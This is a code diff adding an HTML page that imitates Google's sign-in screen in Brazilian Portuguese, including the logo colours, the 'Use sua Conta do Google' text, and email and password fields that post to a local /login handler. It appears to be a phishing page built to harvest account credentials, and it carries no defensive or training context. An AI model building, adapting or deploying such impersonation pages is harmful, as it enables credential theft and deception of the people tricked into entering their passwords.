@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<title>Google - Fazer Login</title>
+<style>
+    body { font-family: arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+    .container { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; width: 350px; text-align: center; }
+    .logo { font-size: 24px; font-weight: bold; color: #4285f4; margin-bottom: 10px; }
+    input { width: 100%; padding: 13px 0; margin-bottom: 20px; border: 1px solid #dadce0; border-radius: 4px; padding-left: 10px; }
+    button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: bold; cursor: pointer; float: right; }
+</style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo"><span style="color:#4285f4">G</span><span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span></div>
+        <p>Fazer login</p>
+        <p>Use sua Conta do Google</p>
+        <form action="/login" method="POST">
+            <input type="email" name="email" placeholder="Email ou telefone" required>
+            <input type="password" name="password" placeholder="Digite sua senha" required>
+            <button type="submit">Próxima</button>
+        </form>
+    </div>
+</body>
+</html>
